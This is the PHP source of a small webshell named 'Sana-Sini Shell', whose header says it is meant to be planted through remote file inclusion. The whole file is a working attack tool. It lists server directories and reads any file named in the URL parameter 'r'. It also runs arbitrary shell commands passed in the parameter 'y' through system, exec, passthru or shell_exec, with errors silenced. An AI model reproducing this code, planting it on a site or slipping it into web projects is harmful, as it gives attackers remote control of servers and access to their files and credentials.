<?php
/**********************************************
Name: <Sana-Sini> Shell (Lite Version)        *
Author: ./MyHeartIsyr                         *
Blog: https://myheart-isyr.blogspot.com       *
Description: Mini webshell, you can use this  *
webshell for RFI (if possible)                *
***********************************************/

// -- Styles
echo "<style>
.rd {
	background: #000;
	color: #fff;
}
h1 {
	font-family: DejaVu Sans Mono;
	text-align: center;
}
pre {
	font-family: Courier New;
}
</style>
<h1>&lt;Sana-Sini&gt; Lite Shell</h1>";

// -- Listing Directories
if(isset($_GET['x'])){
	$xcwd = $_GET['x'];
	chdir($xcwd);
}
else {
	$xcwd = @getcwd();
}
$xcwd = strtolower(substr(PHP_OS,0,3)) == "win" ? str_replace("\\", "/", $xcwd) : $xcwd;
if($open = opendir($xcwd)){
	echo "<pre>";
	while($baca = readdir($open)){
		if(is_dir($baca)){
			echo "<a href='?x=$xcwd/$baca'><font color='red'>";
		}
		else {
			echo "<a href='?r=$xcwd/$baca&x=$xcwd'><font color='black'>";
		}
		echo "$baca";
		echo "</font></a><br>";
	}
	echo "</pre>";
}
else {
	echo "<pre>Failed to Listing Directories</pre>";
}

// -- Read File
if(isset($_GET['r'])){
	echo "<pre class='rd'>".htmlspecialchars(file_get_contents($_GET['r']))."</pre>";
}

// -- Command Execution
if(isset($_GET['y'])){
	echo "<pre>".exe($_GET['y'])."</pre>";
}

// -- Function
function exe($cmd) {  
if(function_exists('system')) {      
        @ob_start();    
        @system($cmd);  
        $buff = @ob_get_contents();      
        @ob_end_clean();    
        return $buff;
    } elseif(function_exists('exec')) {      
        @exec($cmd,$results);    
        $buff = "";      
        foreach($results as $result) {      
            $buff .= $result;    
        } return $buff;  
    } elseif(function_exists('passthru')) {      
        @ob_start();    
        @passthru($cmd);    
        $buff = @ob_get_contents();      
        @ob_end_clean();    
        return $buff;
    } elseif(function_exists('shell_exec')) {    
        $buff = @shell_exec($cmd);  
        return $buff;
    }
}